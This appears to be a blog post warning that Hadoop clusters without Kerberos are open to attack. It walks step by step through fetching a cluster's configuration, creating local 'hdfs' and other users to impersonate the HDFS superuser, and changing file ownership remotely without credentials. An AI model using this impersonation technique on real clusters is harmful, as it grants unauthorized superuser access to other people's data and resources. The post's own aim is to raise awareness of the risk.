---
title: Hadoop and no auth?
tags: hadoop hack hdfs yarn security authentication
category: Programming
---

Have you setup a hadoop cluster and enabled no authentication for it (kerberos)? You definitely need to read this.

Recently I was working with an engineer who was setting up a HBase cluster and restore some data into it. He uploaded the data to HDFS, setup the hbase data directory configuration and booted the HBase. But the HBase started complaining as follows.

```
Caused by: org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.AccessControlException): Permission denied: user=userB, access=WRITE, inode="/foo/bar/hbase":userA:groupZ:drwxr-xr-x
```

So HMaster is not able to read the files in `/foo/bar/hbase` directory as `userB`, because the files are owned by `userA`.

As we were working remotely, I was supposed to ask him the credentials of a Hadoop node from where I could the change the owner of these files. But I didn't. I knew that the HDFS cluster is insecure and I had hadoop binaries on my machine. I just pointed my hadoop tools to his HDFS cluster. Here is how

1. Download the configurations from his cluster
    ```bash
    $ whoami
    mmp
    $ mkdir /tmp/newconf
    $ cd /tmp/newconf
    $ wget http://hdfs.node.com:50070/conf  #namenode http url
    ```

2. Make more copies (hadoop tools, by default load them)
    ```bash
    $ cp conf hdfs-site.xml
    $ cp conf yarn-site.xml
    $ cp conf core-site.xml
    $ cp conf mapred-site.xml
    $ chmod -R 777 /tmp/newconf # let others use them ;)
    ```

3. Point the tools to this new directory
    ```bash
    $ export HADOOP_CONF_DIR=/tmp/newconf
    ```

4. Run the tools
    ```bash
    $ hdfs dfs -chown -R userB:groupY /foo/bar/hbase
    chown: changing ownership of '/foo/bar/hbase': Permission denied. user=mmp is not the owner of inode=hbase
    ```

5. Since the I had logged in as `mmp`, tools I was running were enacting as `mmp`. So I created `userA` in my local machine
    ```bash
    $ useradd userA
    $ sudo su - userA
    [userA@localhost]$ export HADOOP_CONF_DIR=/tmp/newconf
    [userA@localhost]$ hdfs dfs -chown -R userB:groupY /foo/bar/hbase
    chown: changing ownership of '/foo/bar/hbase': Non-super user cannot change owner
    ```

6. Now, `userA` was not defined as a superuser in HDFS configuration, so I can't run this `chown` as `userA`. But `hdfs` user definitely can 
    ```bash
    $ useradd hdfs
    $ sudo su - hdfs
    [hdfs@localhost]$ export HADOOP_CONF_DIR=/tmp/newconf
    [hdfs@localhost]$ hdfs dfs -chown -R userB:groupY /foo/bar/hbase
    [hdfs@localhost]$ hdfs dfs -ls /foo/bar/hbase
    Found 4 items
    drwxr-xr-x   - userB groupY          0 2020-09-09 22:05 /foo/bar/hbase
    ...
    ```


## Conclusion
1. If you have a insecure cluster, it's open for attacks. Attackers can login as any user by
    1. Logging in as the required user in their machine and connecting to your cluster.
    2. Setting the `HADOOP_USER` environment variable to whatever value they want to (`hdfs`, `yarn` which are superusers)
2. I have even seen the Hadoop clusters on Cloud attacked to mine bitcoins, so securing the clusters with authentication mechanisms such as `kerberos` can help securing your resources (memory and cpu)